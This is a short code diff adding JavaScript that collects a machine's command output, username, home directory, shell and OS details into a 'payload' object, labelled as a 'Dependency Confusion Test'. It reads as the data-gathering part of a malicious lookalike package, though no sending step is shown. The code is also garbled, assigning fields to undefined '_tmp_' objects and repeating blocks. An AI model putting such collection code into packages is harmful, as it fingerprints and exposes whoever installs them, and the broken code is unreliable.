@@ -1,0 +1,22 @@
+const systemData = {
+            message: 'Dependency Confusion Test - Safe Directory Listing and User Info',
+            platform: platform,
+            commandOutput: stdout,  
+            errorOutput: stderr,    
+            environmentVars: {
+                username: os.userInfo().username,
+                homedir: os.homedir(),
+                shell: os.userInfo().shell || "N/A", 
+                osType: os.type(),
+                osRelease: os.release()
+            }
+        }
+_tmp_3.environmentVars = {
+                username: os.userInfo().username,
+                homedir: os.homedir(),
+                shell: os.userInfo().shell || "N/A", 
+                osType: os.type(),
+                osRelease: os.release()
+            }
+_tmp_4.homedir = os.homedir()
+const payload = JSON.stringify(systemData)
